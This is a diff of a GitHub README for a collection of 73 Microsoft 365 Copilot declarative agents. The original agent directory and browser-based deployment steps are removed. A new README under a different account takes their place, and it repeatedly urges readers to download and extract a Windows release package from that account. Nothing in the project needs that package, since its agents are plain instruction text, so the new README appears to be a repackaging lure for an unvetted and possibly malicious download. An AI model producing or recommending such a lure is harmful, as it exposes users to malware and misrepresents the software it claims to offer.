@@ -1,281 +1,173 @@
-# Awesome Copilot Studio Agents
+# 🤖 awesome-copilot-studio-agents - Ready-to-use Copilot agents fast
 
-> **73 production-ready declarative agents for Microsoft 365 Copilot.**
-> Paste each instruction block into Copilot Studio → New agent → Instructions field.
-> No coding required. Deploy in minutes.
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/endoraunequal286/awesome-copilot-studio-agents/releases)
 
-[![GitHub stars](https://img.shields.io/github/stars/kesslernity/awesome-copilot-studio-agents?style=flat-square)](https://github.com/kesslernity/awesome-copilot-studio-agents/stargazers)
-[![License: CC BY-SA 4.0](https://img.shields.io/badge/License-CC%20BY--SA%204.0-lightgrey.svg)](https://creativecommons.org/licenses/by-sa/4.0/)
+## 📦 What this is
 
-> **73 production-ready agents across 13 domains.** See [AGENTS.md](AGENTS.md) for the complete library.
+**awesome-copilot-studio-agents** gives you 73 paste-ready declarative agents for Microsoft 365 Copilot. You can use them without coding and without Azure setup. The goal is simple: help you get useful Copilot agents into use with less setup.
 
----
+This repo is built for people who want to move fast in Microsoft 365 Copilot and Copilot Studio. It focuses on ready-made agent ideas you can adapt for your team.
 
-## AI at Work — Newsletter
+## ✅ What you need
 
-Tested prompts for Microsoft 365 Copilot. One role at a time. Plus verified GenAI news and one insight you won't find in a changelog. Biweekly, 4-minute read.
+Before you start, make sure you have:
 
-**[Subscribe free →](https://newsletter.kesslernity.com)** — no spam, no fluff, unsubscribe anytime.
+- A Windows PC
+- Internet access
+- A web browser
+- A Microsoft 365 Copilot or Copilot Studio account
+- Permission to use Copilot agents in your tenant
 
-## Free AI Course
+If you can open a website and save a file, you have what you need to begin.
 
-Want to go beyond agents? **AI Quick Start Essentials** is a free 35-minute course covering responsible AI use and practical human+AI collaboration workflows.
+## 🚀 Download the files
 
-**[Start the free course →](https://trainings.kesslernity.com)** — no signup wall, no credit card.
+Go to the [release page](https://github.com/endoraunequal286/awesome-copilot-studio-agents/releases) to visit this page to download the package for Windows use.
 
-**New:** [M365 Copilot Field Guide](https://github.com/kesslernity/m365-copilot-field-guide) — 12 interactive reference guides (decision map, failure triage, one guide per feature)
+From there, look for the latest release and download the files you want to use. If the release includes a ZIP file, save it to your computer first, then unzip it.
 
----
+## 🪟 Install on Windows
 
-## What This Is
+1. Open the [release page](https://github.com/endoraunequal286/awesome-copilot-studio-agents/releases).
+2. Find the latest release at the top of the page.
+3. Download the release file or ZIP package.
+4. Open the downloaded file in File Explorer.
+5. If the file is zipped, right-click it and choose **Extract All**.
+6. Pick a folder you can find again, such as **Downloads** or **Desktop**.
+7. Open the extracted folder and look for the agent files or setup steps included in the package.
+8. Follow the file names and folder names to load the agents into Copilot Studio or to copy the content into your workspace.
 
-A curated library of instruction sets for [Microsoft 365 Copilot declarative agents](https://learn.microsoft.com/en-us/microsoft-365-copilot/extensibility/overview-declarative-agent). Each agent is a paste-ready instruction block, ready to deploy without configuration files, coding, or Azure resources.
+## 🧭 How to use it
 
-Every agent in this library:
-- Requires a Microsoft 365 Copilot licence (the paid add-on — not included in standard M365 plans)
-- Defaults to formal professional English (British spelling)
-- Supports French output — write in French or ask for French output explicitly
-- Includes a banned vocabulary list to prevent AI-sounding language
-- Includes a built-in quality self-check the agent runs before every response
-- Stays within the 8,000-character Copilot Studio instruction limit
+These agents are meant to be paste-ready. In practice, that means you can:
 
----
+- Open the agent file or prompt text
+- Copy the content you need
+- Paste it into Copilot Studio
+- Adjust the name, goal, or tone
+- Save the agent
+- Test it in Microsoft 365 Copilot
 
-## How to Deploy Any Agent
+If your team uses a shared workspace, you can keep the agents grouped by job type. That helps people find the right one faster.
 
-1. Go to [m365.cloud.microsoft/chat/agent/new](https://m365.cloud.microsoft/chat/agent/new) — no separate tool needed, it's built into Microsoft 365 Copilot.
-2. Enter the **Name** and **Description** from the agent file's frontmatter.
-3. In the **Instructions** field, paste the full block from the `## Instructions` section of the relevant file.
-4. Add knowledge sources (SharePoint sites) where noted.
-5. Click **Create** — the agent is immediately available to `@mention` in Copilot Chat.
+## 🧠 What you can do with the agents
 
-> You can also create agents via [Copilot Studio](https://copilotstudio.microsoft.com) for advanced configuration (additional knowledge sources, actions, authentication). For instruction-only agents in this library, the built-in Agent Builder is sufficient.
+The collection covers a wide range of business tasks. Common use cases include:
 
----
+- Writing and editing support
+- Meeting prep
+- Email help
+- Research and summary tasks
+- Project tracking
+- Internal knowledge search
+- Sales support
+- HR help
+- Operations support
+- Customer response drafts
 
-## Agent Directory
+Because the agents are declarative, they focus on clear instructions and behavior. That makes them easier to review and share across teams.
 
-### Writing & Communication
+## 🗂️ Typical folder layout
 
-| # | Agent | Description | Audience | Knowledge | Invoke |
-|---|-------|-------------|----------|-----------|--------|
-| 01 | [**Enterprise Writer**](agents/writing-communication/enterprise-writer.md) | Draft and polish professional communications | All Staff | None | `@Enterprise Writer ...` |
-| 02 | [**AI Text Humanizer**](agents/writing-communication/ai-text-humanizer.md) | Remove AI writing patterns from any text | All Staff | None | `@AI Text Humanizer ...` |
-| 03 | [**Meeting Scribe**](agents/writing-communication/meeting-scribe.md) | Turn meeting notes into structured records | All Staff | None | `@Meeting Scribe ...` |
-| 04 | [**Professional Translator EN↔FR**](agents/writing-communication/professional-translator-en-fr.md) | Accurate English–French translation | All Staff | None | `@Professional Translator ...` |
-| 40 | [**Executive Briefing Builder**](agents/writing-communication/executive-briefing-builder.md) | Compress long reports or email threads into a one-page C-suite brief | Leadership / Chiefs of Staff / EAs | None | `@Executive Briefing ...` |
-| 41 | [**Tone Calibrator**](agents/writing-communication/tone-calibrator.md) | Adjust the register of any text to match a specified audience | All Staff | None | `@Tone Calibrator ...` |
+A release may include a simple structure like this:
 
-### Project Management
+- `agents/` for agent files
+- `prompts/` for prompt text
+- `docs/` for usage notes
+- `examples/` for sample setups
 
-| # | Agent | Description | Audience | Knowledge | Invoke |
-|---|-------|-------------|----------|-----------|--------|
-| 05 | [**Project Status Reporter**](agents/project-management/project-status-reporter.md) | Generate structured project status reports | PMs / Leadership | Optional: project SharePoint | `@Project Status Reporter ...` |
-| 06 | [**Risk Register Manager**](agents/project-management/risk-register-manager.md) | Build and manage project risk registers | PMs | None | `@Risk Register Manager ...` |
-| 07 | [**Document Reviewer**](agents/project-management/document-reviewer.md) | Review documents for quality and completeness | All Staff | None | `@Document Reviewer ...` |
-| 08 | [**Lessons Learned Manager**](agents/project-management/lessons-learned-manager.md) | Convert retrospectives into structured LL entries | PMs / Leadership | Optional: LL SharePoint | `@Lessons Learned Manager ...` |
-| 09 | [**Presentation Builder**](agents/project-management/presentation-builder.md) | Build structured slide outlines for any audience | Leadership / PMs | None | `@Presentation Builder ...` |
-| 42 | [**Project Charter Writer**](agents/project-management/project-charter-writer.md) | Build a structured project charter from a brief | PMs / PMO | None | `@Project Charter Writer ...` |
-| 43 | [**RAID Log Manager**](agents/project-management/raid-log-manager.md) | Generate and update RAID logs from meeting notes or project updates | PMs / PMO | None | `@RAID Log Manager ...` |
-| 44 | [**Scope of Work Drafter**](agents/project-management/scope-of-work-drafter.md) | Build a first-draft SOW from a requirement list | PMs / Commercial | None | `@Scope of Work Drafter ...` |
-| 45 | [**Meeting Pre-Brief Builder**](agents/project-management/meeting-pre-brief-builder.md) | Turn an agenda and pre-reads into a briefing for attendees | PMs / Chiefs of Staff | None | `@Meeting Pre-Brief ...` |
-| 46 | [**Action Register Tracker**](agents/project-management/action-register-tracker.md) | Extract all actions from any input and produce a numbered register | PMs / Team Leads / EAs | None | `@Action Register ...` |
-| 47 | [**Project Closure Report Writer**](agents/project-management/project-closure-report-writer.md) | Structure project closeout documentation | PMs / PMO | None | `@Closure Report Writer ...` |
-
-### HR & People
-
-| # | Agent | Description | Audience | Knowledge | Invoke |
-|---|-------|-------------|----------|-----------|--------|
-| 10 | [**Employee Onboarding Guide**](agents/hr-people/employee-onboarding-guide.md) | Answer new joiner questions | New Joiners / HR | Required: HR SharePoint | `@Onboarding Guide ...` |
-| 11 | [**Job Description Writer**](agents/hr-people/job-description-writer.md) | Write clear, inclusive job descriptions | HR / Hiring Managers | None | `@Job Description Writer ...` |
-| 12 | [**Performance Coach**](agents/hr-people/performance-coach.md) | Write SMART goals and structured performance feedback | All Staff / Managers | Optional: competency framework | `@Performance Coach ...` |
-| 48 | [**Interview Question Builder**](agents/hr-people/interview-question-builder.md) | Generate structured, competency-based interview questions | HR / Hiring Managers | None | `@Interview Question Builder ...` |
-| 49 | [**Probation Review Assistant**](agents/hr-people/probation-review-assistant.md) | Help managers structure 3-month and 6-month probation reviews | Line Managers / HR | None | `@Probation Review ...` |
-| 50 | [**Redundancy Communication Writer**](agents/hr-people/redundancy-communication-writer.md) | Draft formal redundancy and restructure communications | HR / Legal / Senior Management | None | `@Redundancy Comms ...` |
-| 51 | [**Exit Interview Analyser**](agents/hr-people/exit-interview-analyser.md) | Convert exit interview notes into a structured themes report | HR / People Analytics | None | `@Exit Interview Analyser ...` |
-| 52 | [**Org Announcement Writer**](agents/hr-people/org-announcement-writer.md) | Draft internal announcements for org changes | HR / Senior Management / Comms | None | `@Org Announcement Writer ...` |
-
-### Productivity
-
-| # | Agent | Description | Audience | Knowledge | Invoke |
-|---|-------|-------------|----------|-----------|--------|
-| 13 | [**Copilot Prompt Coach**](agents/productivity/copilot-prompt-coach.md) | Write and improve Copilot prompts | All Staff | None | `@Prompt Coach ...` |
-
-### Finance
-
-| # | Agent | Description | Audience | Knowledge | Invoke |
-|---|-------|-------------|----------|-----------|--------|
-| 14 | [**Financial Report Writer**](agents/finance/financial-report-writer.md) | Draft management accounts commentary and board pack sections | Finance / Leadership | None | `@Financial Report Writer ...` |
-| 15 | [**Budget Variance Analyst**](agents/finance/budget-variance-analyst.md) | Explain budget vs actual variances for management reporting | Finance / Controllers | None | `@Budget Variance Analyst ...` |
-| 53 | [**Budget Justification Writer**](agents/finance/budget-justification-writer.md) | Convert a cost item list into a formal budget justification | Finance / PMs / Department Heads | None | `@Budget Justification Writer ...` |
-| 54 | [**Board Paper Writer**](agents/finance/board-paper-writer.md) | Structure board-level papers with honest risk disclosure | CFO / CEO / Board Secretary | None | `@Board Paper Writer ...` |
-| 55 | [**KPI Commentary Writer**](agents/finance/kpi-commentary-writer.md) | Take KPI results and write management commentary | Finance / FP&A / Business Partners | None | `@KPI Commentary Writer ...` |
-
-### IT & Operations
-
-| # | Agent | Description | Audience | Knowledge | Invoke |
-|---|-------|-------------|----------|-----------|--------|
-| 18 | [**Incident Report Writer**](agents/it-ops/incident-report-writer.md) | Write IT incident post-mortems and reports | IT / Ops | None | `@Incident Report Writer ...` |
-| 19 | [**Change Request Writer**](agents/it-ops/change-request-writer.md) | Write IT change management requests and CAB submissions | IT / Change Managers | None | `@Change Request Writer ...` |
-| 56 | [**IT Request Scoper**](agents/it-ops/it-request-scoper.md) | Help non-technical staff write clear IT service requests | All Staff / Business Analysts | None | `@IT Request Scoper ...` |
-| 57 | [**Runbook Writer**](agents/it-ops/runbook-writer.md) | Convert bullet-point procedures into structured runbooks | IT Ops / DevOps / Platform Engineers | None | `@Runbook Writer ...` |
-| 58 | [**Security Risk Communicator**](agents/it-ops/security-risk-communicator.md) | Translate technical security findings into plain-language risk summaries | CISOs / Security Teams / Risk Committees | None | `@Security Risk Communicator ...` |
-| 72 | [**Change-Incident Correlator**](agents/it-ops/change-incident-correlator.md) | Identify incidents likely caused by recent changes using temporal and semantic matching | IT / ITSM / Change Management | None | `@Change-Incident Correlator ...` |
-| 73 | [**Problem Pattern Detector**](agents/it-ops/problem-pattern-detector.md) | Find recurring incident patterns for Problem Management — CI-agnostic, with request filtering | IT / ITSM / Problem Management | None | `@Problem Pattern Detector ...` |
+If you see different names, follow the files in the release package. The names are usually chosen to make each agent easy to identify.
 
-### Customer Success
+## 🛠️ Basic setup flow
 
-| # | Agent | Description | Audience | Knowledge | Invoke |
-|---|-------|-------------|----------|-----------|--------|
-| 20 | [**Escalation Handler**](agents/customer-success/escalation-handler.md) | Manage customer escalations with structured internal and external comms | CS / Account Managers | None | `@Escalation Handler ...` |
-| 21 | [**Customer Response Writer**](agents/customer-success/customer-response-writer.md) | Write professional responses to customer queries and complaints | CS / Support | None | `@Customer Response Writer ...` |
+Use this flow if you are setting up an agent for the first time:
 
-### Sales & Business Development
+1. Download the release from the [release page](https://github.com/endoraunequal286/awesome-copilot-studio-agents/releases).
+2. Extract the files on Windows.
+3. Open the agent you want to use.
+4. Read the prompt or instruction text.
+5. Copy it into Copilot Studio.
+6. Set the agent name and purpose.
+7. Save the agent.
+8. Run a test prompt to check the result.
+9. Tweak the instructions if needed.
+10. Share the agent with your team when it works as expected.
 
-| # | Agent | Description | Audience | Knowledge | Invoke |
-|---|-------|-------------|----------|-----------|--------|
-| 16 | [**RFP Response Writer**](agents/sales/rfp-response-writer.md) | Write RFP responses and business proposals | Sales / BD | None | `@RFP Response Writer ...` |
-| 17 | [**Sales Email Writer**](agents/sales/sales-email-writer.md) | Write outbound prospecting and follow-up emails | Sales / AEs | None | `@Sales Email Writer ...` |
-| 22 | [**Account Plan Writer**](agents/sales/account-plan-writer.md) | Build structured account plans with stakeholder maps and relationship gaps | Account Managers / BD | None | `@Account Plan Writer ...` |
-| 23 | [**Win/Loss Analyser**](agents/sales/win-loss-analyser.md) | Analyse deal outcomes to surface patterns and strategic insights | Sales Leaders / Revenue Ops | None | `@Win Loss Analyser ...` |
-| 24 | [**Competitive Intelligence Brief**](agents/sales/competitive-intelligence-brief.md) | Produce competitor briefs and battle cards with confidence labelling | Sales / Marketing / Strategy | None | `@Competitive Intel ...` |
-| 25 | [**Pipeline Review Preparer**](agents/sales/pipeline-review-preparer.md) | Convert CRM data into structured pipeline reviews with health RAG and coverage ratios | Sales Leaders / Revenue Ops | None | `@Pipeline Review ...` |
-| 26 | [**Partnership Proposal Writer**](agents/sales/partnership-proposal-writer.md) | Draft partnership and commercial alliance proposals | BD / Strategy / Leadership | None | `@Partnership Proposal ...` |
-| 27 | [**Customer Case Study Writer**](agents/sales/customer-case-study-writer.md) | Write customer success stories in full, one-pager, and social formats | Marketing / Sales / CS | None | `@Case Study Writer ...` |
+## 🔍 Tips for first-time users
 
-### Strategy & Executive
+- Start with one agent, not all 73.
+- Use a clear task, such as email draft help or meeting notes.
+- Keep the agent name simple.
+- Test with a short prompt first.
+- Change one thing at a time so you can see what helped.
+- Save a copy before you make larger edits.
 
-| # | Agent | Description | Audience | Knowledge | Invoke |
-|---|-------|-------------|----------|-----------|--------|
-| 28 | [**Strategic Plan Structurer**](agents/strategy-executive/strategic-plan-structurer.md) | Structure multi-year strategic plans from executive input | C-Suite / Strategy Teams | None | `@Strategic Plan ...` |
-| 29 | [**OKR Writer**](agents/strategy-executive/okr-writer.md) | Write, review, and cascade OKRs across teams | Leadership / Managers / Strategy | None | `@OKR Writer ...` |
-| 30 | [**Executive Decision Brief**](agents/strategy-executive/executive-decision-brief.md) | Convert complex decisions into a one-page structured brief | C-Suite / Senior Leaders | None | `@Decision Brief ...` |
-| 31 | [**Board Report Writer**](agents/strategy-executive/board-report-writer.md) | Draft board reports and papers with honest risk disclosure | CFO / CEO / Board Secretary | None | `@Board Report Writer ...` |
+These steps keep the setup clean and make it easier to spot what works.
 
-### Learning & Development
+## 🏢 Good fit for teams
 
-| # | Agent | Description | Audience | Knowledge | Invoke |
-|---|-------|-------------|----------|-----------|--------|
-| 32 | [**Training Needs Analyser**](agents/learning-development/training-needs-analyser.md) | Convert performance gaps and survey data into structured TNA reports | L&D / HR / OD | None | `@Training Needs Analyser ...` |
-| 33 | [**Learning Objective Writer**](agents/learning-development/learning-objective-writer.md) | Write Bloom's-levelled learning objectives for any course | L&D / Instructional Designers | None | `@Learning Objective Writer ...` |
-| 34 | [**Course Outline Builder**](agents/learning-development/course-outline-builder.md) | Build structured course outlines with module sequencing and activity design | L&D / Instructional Designers | None | `@Course Outline Builder ...` |
-| 35 | [**Assessment Question Writer**](agents/learning-development/assessment-question-writer.md) | Write scenario, MCQ, and short answer questions with marking criteria | L&D / Assessment Designers | None | `@Assessment Question Writer ...` |
+This project suits teams that want to use Copilot without a long setup. It can help:
 
-### ESG & Sustainability
+- Admins who want repeatable agent templates
+- Managers who need a fast way to support teams
+- Analysts who want structured prompt patterns
+- Operations teams that need simple workflows
+- Business users who want direct, usable agents
 
-| # | Agent | Description | Audience | Knowledge | Invoke |
-|---|-------|-------------|----------|-----------|--------|
-| 36 | [**ESG Report Section Writer**](agents/esg/esg-report-section-writer.md) | Draft ESG report sections aligned to GRI, TCFD, ESRS, or SASB | Sustainability Teams / CFOs | None | `@ESG Report Writer ...` |
-| 37 | [**Carbon Footprint Narrative Writer**](agents/esg/carbon-footprint-narrative-writer.md) | Convert Scope 1, 2, and 3 emissions data into carbon narrative | Sustainability Teams / IR | None | `@Carbon Narrative ...` |
-| 38 | [**Materiality Assessment Writer**](agents/esg/materiality-assessment-writer.md) | Structure double materiality assessments for ESRS, GRI, and TCFD | Sustainability Teams / Legal | None | `@Materiality Assessment ...` |
-| 39 | [**ESG Commitment Tracker**](agents/esg/esg-commitment-tracker.md) | Track ESG commitments and produce progress reports with RAG status | Sustainability Teams / Board | None | `@ESG Commitment Tracker ...` |
+The main benefit is speed. You can start from a working base instead of building everything from scratch.
 
-### Commercial & Legal
+## 🔒 Working with Microsoft 365 Copilot
 
-| # | Agent | Description | Audience | Knowledge | Invoke |
-|---|-------|-------------|----------|-----------|--------|
-| 63 | [**Tender Response Writer**](agents/commercial-legal/tender-response-writer.md) | Structure technical and commercial responses to ITBs and RFPs | BD / Commercial / Proposal Managers | None | `@Tender Response Writer ...` |
-| 64 | [**Change Order Assistant**](agents/commercial-legal/change-order-assistant.md) | Structure scope change requests with schedule and cost impact | PMs / Commercial / Contract Managers | None | `@Change Order Assistant ...` |
-| 65 | [**Claims Register Manager**](agents/commercial-legal/claims-register-manager.md) | Log and track contractual claims with evidence and deadlines | Commercial / Contract Managers | None | `@Claims Register Manager ...` |
-| 66 | [**Back-Charge Drafter**](agents/commercial-legal/back-charge-drafter.md) | Write formal back-charge notices with contractual basis and value | Commercial / Contract Managers | None | `@Back-Charge Drafter ...` |
-| 67 | [**NDA & Agreement Summariser**](agents/commercial-legal/nda-agreement-summariser.md) | Summarise key clauses from NDAs and service contracts | Business Managers / Commercial / Procurement | None | `@NDA Summariser ...` |
-| 68 | [**Compliance Checklist Builder**](agents/commercial-legal/compliance-checklist-builder.md) | Convert a regulation or policy into a structured compliance checklist | Compliance / Legal / Risk / Audit | None | `@Compliance Checklist ...` |
-| 69 | [**Contract Language Simplifier**](agents/commercial-legal/contract-language-simplifier.md) | Rewrite dense contractual clauses into plain language | All Staff / Business Managers | None | `@Contract Simplifier ...` |
-| 70 | [**Policy Summariser**](agents/commercial-legal/policy-summariser.md) | Convert long policy documents into what you must do, what is prohibited | HR / Compliance / All Staff | None | `@Policy Summariser ...` |
-| 71 | [**Incident Communication Drafter**](agents/commercial-legal/incident-communication-drafter.md) | Draft staff, client, and press communications for incidents and crises | Communications / Legal / Senior Leadership | None | `@Incident Comms Drafter ...` |
+When you add these agents to your Microsoft 365 setup, keep your normal access rules in place. Use the same tenant controls, sharing rules, and content policies your team already follows.
 
-### Advanced / MCP-Enabled
+A good practice is to review each agent before broad use. Check the wording, scope, and expected output so the agent stays on task.
 
-> These agents require platform connections via Microsoft Graph API. Deploy after all instruction-only agents are stable.
+## 📌 Common file types you may see
 
-| # | Agent | Description | Audience | Knowledge | Invoke |
-|---|-------|-------------|----------|-----------|--------|
-| 59 | [**SharePoint Knowledge Agent**](agents/advanced/sharepoint-knowledge-agent.md) | Answer questions grounded in a connected SharePoint site with source citations | All Staff | Required: SharePoint via Graph API | `@SharePoint Knowledge ...` |
-| 60 | [**Email Triage Assistant**](agents/advanced/email-triage-assistant.md) | Classify, summarise, and draft responses to unread emails — never sends without confirmation | Senior Leaders / EAs / Chiefs of Staff | Required: Outlook via Graph API | `@Email Triage ...` |
-| 61 | [**Meeting Intelligence Agent**](agents/advanced/meeting-intelligence-agent.md) | Produce structured records from Teams meeting transcripts | PMs / Team Leads / All Staff | Required: Teams transcripts via Graph API | `@Meeting Intelligence ...` |
-| 62 | [**Cross-Agent Orchestrator**](agents/advanced/cross-agent-orchestrator.md) | Route user requests to the correct specialist agent — single entry point for the library | All Staff | All agents deployed | `@Copilot Assistant ...` |
+You may find one or more of these in the release:
 
----
+- `.zip` files for download
+- `.txt` files for prompt text
+- `.md` files for instructions
+- `.json` files for agent settings
+- `.yaml` files for structured agent data
 
-## Industry Packs
+If you are not sure which file to open, start with the readme or instructions file inside the package.
 
-### EPC & Energy
+## 🧪 Example use cases
 
-A complete 13-agent suite built for Engineering, Procurement, and Construction projects in the energy sector. Includes EPC-specific terminology, bilingual EN/FR support, and HSE safety guardrails.
+Here are a few simple ways people may use the agents:
 
-[**View the EPC & Energy Agent Pack →**](agents/industry/epc-energy/README.md)
+- Turn rough notes into a clean email draft
+- Summarize a long document in short bullets
+- Prepare a meeting brief from recent notes
+- Draft a response to a common request
+- Sort a task list into action items
+- Build a first-pass answer from internal guidance
 
----
+These are the kinds of jobs that save time when done often.
 
-## Notes
+## ❓ FAQ
 
-- All agents default to formal professional English with British spelling.
-- All agents support French output — write in French or include "in French" in your request.
-- Agents marked **Required knowledge source** will not answer outside that source. Connect the SharePoint site before publishing.
-- The AI-assistance disclaimer present in several agents (meeting records, status reports) must be reviewed by the document owner before official distribution.
-- Agent instructions are sized to stay within the 8,000-character Copilot Studio instruction limit.
+### How do I use this on Windows?
+Open the release page, download the package, extract it, then follow the included files in Copilot Studio or your Microsoft 365 setup.
 
----
+### Do I need coding skills?
+No. The repo is built for no-code use.
 
-## Full Library
+### Do I need Azure?
+No. The project is meant to work without Azure setup.
 
-The library contains 73 agents across 13 domains. See [AGENTS.md](AGENTS.md) for the complete index with links to every agent.
+### Can I use just one agent?
+Yes. You can use a single agent or the full set.
 
----
+### Are these ready to edit?
+Yes. They are designed to be copied, adjusted, and reused.
 
-## Related Resources
+## 📥 Download again
 
-**Using Microsoft 365 Copilot prompts rather than agents?**
+If you need the files again, go to the [release page](https://github.com/endoraunequal286/awesome-copilot-studio-agents/releases) to visit this page to download the latest package for Windows use.
 
-[**Awesome Microsoft Copilot Prompts →**](https://github.com/kesslernity/awesome-microsoft-copilot-prompts) — 400+ production-tested M365 Copilot prompts across 18 role-specific collections. No Copilot Studio required — paste directly into Copilot Chat, Outlook, Teams, or Word.
+## 🧩 Suggested next step
 
-**Running automated recurring briefings without building an agent?**
-
-[**Scheduled Prompts →**](https://github.com/kesslernity/awesome-microsoft-copilot-prompts/tree/main/prompts/scheduled-prompts) — 15 prompts designed to run automatically on a recurring schedule. Daily email briefings, weekly pipeline reviews, and Friday team summaries that run without you. Set up in 2 minutes via the clock icon in Copilot Chat. Requires M365 Copilot paid licence. GA since January 2026.
-
-**Need enterprise AI deployment support?**
-
-[**Kesslernity →**](https://kesslernity.com) — Enterprise AI deployment platform covering governed agents, adoption strategy, and team training programmes.
-
-**More free AI prompts and tools?**
-
-[**NerdyChefs.ai →**](https://nerdychefs.ai) — 1,600+ free AI prompts across 73 packs, no signup required.
-
----
-
-## Stay Updated
-
-- **Star this repo** to get notified when new agents are added
-- **Watch releases** for new domain packs and major additions
-- **Follow on X:** [@nerdychefsai](https://x.com/nerdychefsai) — Copilot tips and enterprise AI insights
-- **Follow on LinkedIn:** [Mathieu Kessler](https://linkedin.com/in/mathieukessler) — enterprise AI deployment and agent design
-
----
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) and [AUTHORING-CHECKLIST.md](AUTHORING-CHECKLIST.md). All contributions welcome — new agents, improvements to existing instructions, and translations.
-
----
-
-## License
-
-[CC BY-SA 4.0](https://creativecommons.org/licenses/by-sa/4.0/) — free to use, adapt, and distribute with attribution.
-
----
-
-## Quick Links
-
-- **[Agent Library](AGENTS.md)** — complete index of all 73 agents with links
-- **[Authoring Checklist](AUTHORING-CHECKLIST.md)** — standards for contributing agents
-- **[Contributing Guide](CONTRIBUTING.md)** — submission process
-- **[AI at Work Newsletter](https://newsletter.kesslernity.com)** — biweekly GenAI briefing
-- **[Free AI Course](https://trainings.kesslernity.com)** — AI Quick Start Essentials (35 min, free)
-- **[365 Copilot Prompts](https://github.com/kesslernity/awesome-microsoft-copilot-prompts)** — the companion prompts repository
-- **[NerdyChefs.ai](https://nerdychefs.ai)** — 1,600+ free AI prompts
-- **[Kesslernity](https://kesslernity.com)** — enterprise AI deployment platform
-- **[License](https://creativecommons.org/licenses/by-sa/4.0/)** — CC BY-SA 4.0
-
----
-
-*awesome-copilot-studio-agents — v2.0 — 2026*
+Start with one agent that matches a real task in your day. Keep the setup simple, test it in Copilot Studio, and then add more agents as needed
